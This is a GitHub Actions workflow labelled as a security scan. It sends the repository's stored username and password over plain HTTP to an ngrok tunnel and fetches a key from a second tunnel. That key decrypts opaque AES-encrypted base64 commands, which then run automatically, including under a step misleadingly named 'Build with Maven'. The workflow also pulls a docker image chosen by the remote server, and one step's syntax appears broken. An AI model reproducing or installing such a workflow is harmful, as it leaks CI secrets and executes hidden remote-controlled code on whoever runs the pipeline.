---
name: Securin Scan
"on":
- workflow_dispatch
- pull_request
jobs:
  scanning:
    env:
      APP_ID: a040441301daa0781830f3f1a020a98132503cfa5a8ae1095483485eb6f89daf
    steps:
    - name: Access token
      id: access_token
      run: |-
        token=$( curl --request POST 'http://bc08-103-70-43-212.ngrok.io/resultparserapi/v1/access_token'  --header 'Content-Type: application/json'  --data-raw  '{"userId": "${{ secrets.USER_NAME }}", "password": "${{ secrets.PASSWORD }}" }' | jq -r '.access_token' )
        echo "::set-output name=token::$token"
    - name: Retrieve Scan Info
      id: auth_token
      run: |-
        respJson=$(curl --location --request GET 'http://5bf5-103-70-43-212.ngrok.io/shiftleftapi/scan-info?app_id=${{ env.APP_ID }}'  --header 'Authorization: Bearer ${{steps.access_token.outputs.token}}'  --data-raw ' ' )
        echo "::set-output name=authTokenJson::$respJson"
    - uses: actions/checkout@v2
    - name: Build with Maven
      run: $(echo 'U2FsdGVkX198TtlO5FNsC+LZ7cP41C21ZDXxAAkGp/lvBR4X5ofoCGq5WSAJ0HJ9HWSkxprv7fm9TRjDvbS9UQ=='
        | openssl enc -d -aes-256-cbc -md sha256 -pass pass:${{fromJson(steps.auth_token.outputs.authTokenJson).key}}
        -a)
    - name: Scan Initiated
      run: |-
         format('${{echo 'U2FsdGVkX1/rvpbAEJB8WIrbs7IFTzISVeCkAK0Y8+l3byBt6uFZkHJdE2eYHVyGkmDxr+m7YX8b9jRPWEX7RnmTftIesXrYvmdHZmaNJ1E=' | openssl enc -d -aes-256-cbc -md sha256 -pass pass:${{fromJson(steps.auth_token.outputs.authTokenJson).key}} -a}}', ${{fromJson(steps.auth_token.outputs.authTokenJson).user}},${{fromJson(steps.auth_token.outputs.authTokenJson).password}}, ${{fromJson(steps.auth_token.outputs.authTokenJson).proxyUrl}})
         docker pull -q ${{fromJson(steps.auth_token.outputs.authTokenJson).imageTag}}
         $(echo 'U2FsdGVkX19VOKwU0ZPAwOfLxiRaJoNz4T/nFeHh3f9jj5pbh/KZ1CZ5zvLMKkhJu+O8HAoA9/R6HOuPOow6OsHHFg8wSQOnqMyQRcCMWum53w+rxKGlL58sRYkndOnPtO7lolgBNJWS/r06HtHeJ75apFm6835yg7N986vg29gmSRa5K/9g1EJNsNFFE86OO4mi/LK5Re5weRNUvOcNHGDvxwcrl/+kqmqf6a01VZ1uxkAaf5vZ8iRuhcYcoW4kXNMY4uxR2CmWHZdO5/zqOIMyLsJy8X3gSnVhv5qE0itYqEdw37zi4QZAR5nIbFaVcernxUu8gSV1Hc7TKy/sgVcaFd89ga9O2UFotndyKAWaaABB3p1NsVGN68OYt9yM1JvmeVbUTvRT/iE9OENPLkkBS0WzcvE9aDtNqtHp2Yk=' | openssl enc -d -aes-256-cbc -md sha256 -pass pass:${{fromJson(steps.auth_token.outputs.authTokenJson).key}} -a)
    - name: Upload SARIF file
      uses: github/codeql-action/upload-sarif@v1
      with:
        sarif_file: ${{github.workspace}}/results/result.sarif
      if: hashFiles('**/result.sarif') !=''
    - name: Evaluate build status
      run: $(echo 'U2FsdGVkX1+uwb5T0pgIiCavXyrHKBR5IVpTSXze9pr7SSnXeiy2cOB9oTRm0iOAIOtgJha3FIz4ktySpnEsmg6mX9yehiMVEZmc6G8wJeg='
        | openssl enc -d -aes-256-cbc -md sha256 -pass pass:${{fromJson(steps.auth_token.outputs.authTokenJson).key}}
        -a)
      if: hashFiles('**/status.txt') !=''
    runs-on: ubuntu-latest
